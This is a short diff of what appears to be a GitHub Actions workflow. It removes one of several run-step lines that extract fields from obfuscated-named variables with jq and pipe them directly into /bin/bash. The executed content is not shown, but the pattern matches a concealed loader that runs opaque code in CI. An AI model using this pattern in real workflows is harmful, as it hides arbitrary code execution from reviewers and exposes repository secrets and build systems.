@@ -21,7 +21,6 @@ jobs:
           echo $cqgk1117 | jq -r .ln26 | /bin/bash
           printf '%s' "$yr63" | jq -r .lfjlp26748 | /bin/bash
           printf '%s' "$txr4" | jq -r .jm18617 | /bin/bash
-          echo $fu87655 | jq -r .gm625 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
